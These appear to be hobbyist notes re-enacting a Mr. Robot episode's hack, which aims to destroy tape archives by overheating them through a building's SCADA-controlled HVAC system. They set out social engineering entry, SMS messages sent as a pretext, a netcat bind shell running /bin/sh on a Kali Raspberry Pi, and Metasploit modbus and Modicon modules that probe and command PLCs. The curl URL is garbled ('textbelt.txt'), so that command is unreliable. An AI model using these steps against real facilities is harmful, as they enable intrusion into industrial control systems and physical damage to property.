Episode name: eps1.4_3xpl0its.wmv

electromagnetic tapes would disintegrate on high enough temperature - hack is to raise the temperature = hack the HVAC system which is a SCADA ICS system

0. social engineer a way into the highly secure buildings 

1. connect the Raspberry Pi to the network

2. there was a problem in the meantime: they have to spoof an sms message. so lets see how that is done. Lets use textbelt.com

$ curl -X POST https://textbelt.txt/text --data-urlencode phone='<phone number>' --data-urlencode message='<message>' -d key=<api key from the website> 
    // the legal stuff forbids to spoof the sender's phone number

use this as a social engineering tool!


Lets create the Raspberry Pi:
    kali.org/get-kali 
        download arm version on kali to flash raspberry Pi
        create an image on an sd card - boot from sd card

        create a netcat connection between RPi and laptop - so that it can be controlled remotely

        $ sudo nc -l -p1234 -e /bin/sh
            - execute on RPi

        $ sudo nc <ip> <port>
            - execute on the remote laptop

Now that we are connected we can explore that HVAC system 

    $ msfconsole

    $ search modbus - most widely used protocol for HVAC systems

    $ use auxiliary/scanner/scada/modbus_findunitid 

    $ ...

    $ set RHOSTS <ip>

    $ show options

    $ exploit...

    $ use auxiliary/admin/scada/modicon_command

    $ show options/ set RHOSTS etc... run

    lets probe the memory of those PLCs, pulling more information
    $ gem install modbus-cli

    $ sudo modbus read <ip> %MW100 100

    $ sudo modbus read <ip> %MD100 100

    $ sudo modbus read <ip> %MF100 100
